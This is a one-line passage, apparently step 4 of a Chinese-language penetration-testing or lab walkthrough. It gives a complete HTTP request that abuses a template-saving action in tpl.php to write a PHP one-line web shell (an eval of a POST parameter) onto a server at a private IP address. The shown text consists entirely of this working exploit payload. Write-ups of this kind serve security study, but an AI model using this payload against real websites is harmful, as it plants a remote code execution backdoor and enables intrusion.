...
4、写入一句话木马，`http://10.6.6.218/fksgi2ikxjfmw/tpl.php?filename=test.lib.php&action=savetagfile&content=<?php @eval($_POST['pass']);?>&token=3e0023997cf2227e0f5a5f993e458a55`
